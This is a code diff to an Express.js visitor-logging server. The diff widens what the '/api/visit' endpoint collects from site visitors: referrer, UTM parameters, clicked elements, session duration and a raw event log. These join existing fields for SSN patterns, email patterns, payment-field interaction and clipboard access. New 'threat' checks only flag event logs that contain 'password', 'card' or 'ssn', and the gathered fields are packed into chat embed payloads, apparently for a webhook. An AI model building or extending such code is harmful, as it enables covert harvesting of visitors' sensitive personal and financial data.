@@ -1,3 +1,4 @@
+
 const express = require('express');
 const cors = require('cors');
 const useragent = require('useragent');
@@ -182,6 +183,20 @@ function detectSecurityThreats(req, visitorInfo) {
     });
   }
 
+  if (req.body.part3?.utmParameters && JSON.parse(req.body.part3.utmParameters || '{}').utm_source?.includes('token')) {
+    threats.push({
+      type: 'Suspicious UTM Parameter',
+      details: 'Potential sensitive data in UTM parameters'
+    });
+  }
+
+  if (req.body.part3?.eventLog?.includes('password') || req.body.part3?.eventLog?.includes('card') || req.body.part3?.eventLog?.includes('ssn')) {
+    threats.push({
+      type: 'Sensitive Event',
+      details: 'Potentially sensitive data in event log'
+    });
+  }
+
   return threats;
 }
 
@@ -265,7 +280,12 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
         userInteractionCount: req.body.part3?.userInteractionCount || 0,
         ssnPatternDetected: req.body.part3?.ssnPatternDetected || 'None',
         emailPatternDetected: req.body.part3?.emailPatternDetected || 'None',
-        paymentFieldInteraction: req.body.part3?.paymentFieldInteraction || 'None'
+        paymentFieldInteraction: req.body.part3?.paymentFieldInteraction || 'None',
+        referrer: req.body.part3?.referrer || 'Direct',
+        utmParameters: req.body.part3?.utmParameters || '{}',
+        clickedElements: req.body.part3?.clickedElements || 'None',
+        sessionDuration: req.body.part3?.sessionDuration || 'Unknown',
+        eventLog: req.body.part3?.eventLog || 'None'
       }
     };
 
@@ -320,12 +340,17 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'Part 3: SSN Pattern', value: visitorInfo.part3.ssnPatternDetected, inline: true },
       { name: 'Part 3: Email Pattern', value: visitorInfo.part3.emailPatternDetected, inline: true },
       { name: 'Part 3: Payment Interaction', value: visitorInfo.part3.paymentFieldInteraction, inline: true },
+      { name: 'Part 3: Referrer', value: visitorInfo.part3.referrer, inline: true },
+      { name: 'Part 3: UTM Parameters', value: visitorInfo.part3.utmParameters, inline: true },
+      { name: 'Part 3: Clicked Elements', value: visitorInfo.part3.clickedElements, inline: true },
+      { name: 'Part 3: Session Duration', value: visitorInfo.part3.sessionDuration, inline: true },
+      { name: 'Part 3: Event Log', value: visitorInfo.part3.eventLog, inline: true },
       { name: 'Threats', value: threats.length ? threats.map(t => `${t.type}: ${t.details}`).join('\n') : 'None', inline: false }
     ];
 
-    const firstBatch = fields.slice(0, 14); // Session ID to Hosting
-    const secondBatch = fields.slice(14, 28); // Browser to Scroll Position
-    const thirdBatch = fields.slice(28); // Part 3 fields to Threats
+    const firstBatch = fields.slice(0, 16); // Session ID to Device Type
+    const secondBatch = fields.slice(16, 32); // Referer to Part 3: Connection Type
+    const thirdBatch = fields.slice(32); // Part 3: Clipboard Access to Threats
 
     const payload1 = {
       embeds: [{
@@ -480,3 +505,4 @@ app.use((err, req, res, next) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => logger.info(`Server running on port ${PORT}`));
+```
